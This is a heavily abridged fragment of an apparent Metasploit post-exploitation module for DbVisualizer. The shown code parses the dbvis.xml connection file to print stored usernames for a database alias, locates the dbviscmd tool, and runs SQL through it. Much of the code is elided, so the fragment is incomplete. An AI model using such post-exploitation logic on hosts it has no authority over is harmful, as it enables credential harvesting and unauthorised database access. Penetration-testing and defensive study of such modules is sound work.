...
class MetasploitModule < Msf::Post
  ...
  def exist_and_supported
    ...
    raw_xml.each_line do |line|
      ...
      if line =~ /<Alias>([\S+\s+]+)<\/Alias>/i
        if datastore['DBALIAS'] == Regexp.last_match(1)
          alias_found = true
      ...
      if line =~ /<Userid>([\S+\s+]+)<\/Userid>/i
        print_good("Username for this connection : #{Regexp.last_match(1)}") if alias_found
      end

      # check the type
      next unless line =~ /<Type>([\S+\s+]+)<\/Type>/i
      next unless alias_found
    ...
    print_error("Database alias not found in dbvis.xml") if db_type.blank?
    db_type # That is empty if DB is not supported
  end
  ...
  def find_dbviscmd
    ...
    when 'windows'
      ...
      program_files = if !progfiles_x86.blank? && progfiles_x86 !~ /%ProgramFiles\(X86\)%/
                        progfiles_x86 # x64
                      else
      ...
      dirs.each do |d|
        dbvis_home_dir = d if d =~ /DbVisualizer[\S+\s+]+/i
      end
  ...
  def dbvis_query(dbvis, sql)
    ...
    if file?(dbvis) == true
      ...
      if (f.uid == Process.euid) || Process.groups.include?(f.gid)
        ...
        error = true if resp =~ /denied|failed/i
      else
